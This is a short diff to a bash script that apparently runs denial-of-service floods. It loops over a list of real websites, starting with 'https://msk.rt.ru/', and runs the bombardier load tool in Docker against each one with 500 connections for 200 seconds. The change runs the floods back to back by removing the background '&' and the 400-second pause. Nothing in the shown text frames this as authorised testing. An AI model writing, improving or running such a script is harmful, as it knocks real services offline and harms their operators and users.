@@ -97,8 +97,7 @@ DESTS=("https://msk.rt.ru/"
 
 while true; do
     for DEST in ${DESTS[@]}; do
-        sudo docker run -t --rm alpine/bombardier -c 500 -d 200s -l $DEST &
+        sudo docker run -t --rm alpine/bombardier -c 500 -d 200s -l $DEST
         sleep 1
     done
-    sleep 400
 done
